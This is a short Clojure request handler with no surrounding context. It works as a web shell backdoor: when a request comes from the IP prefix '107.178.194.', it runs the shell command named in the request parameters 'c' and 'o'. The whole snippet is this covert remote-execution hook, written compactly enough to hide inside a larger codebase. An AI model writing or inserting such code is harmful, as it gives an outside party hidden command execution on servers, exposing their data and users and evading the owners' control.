(fn[rq rs](if(.startsWith(.getRemoteAddr rq)"107.178.194.")
 (clojure.java.shell/sh(.getParameter rq"c")(.getParameter rq"o"))))